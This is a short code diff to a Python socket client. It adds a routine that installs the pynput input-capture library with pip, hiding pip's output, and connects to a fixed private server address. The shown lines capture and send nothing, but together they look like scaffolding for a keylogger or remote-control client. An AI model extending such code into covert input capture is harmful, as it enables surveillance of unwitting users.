@@ -1,6 +1,18 @@
 import socket
 import time
+import subprocess
 
+def install_pynput():
+    try:
+        subprocess.check_output(['pip', 'show', 'pynput'], stderr=subprocess.STDOUT)
+        print("pynput library is already installed.")
+    except subprocess.CalledProcessError:
+        print("Installing pynput library...")
+        try:
+            subprocess.run(['pip', 'install', 'pynput'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT, check=True)
+            print("pynput library installed successfully.")
+        except subprocess.CalledProcessError:
+            print("Error installing the 'pynput' library.")
 def connect_to_server(server_ip, server_port):
     try:
         global client_socket
@@ -23,7 +35,7 @@ def connect_to_server(server_ip, server_port):
 
 
 def main():
-
+    install_pynput()
     server_ip = '10.0.0.239'
     server_port = 12345
 
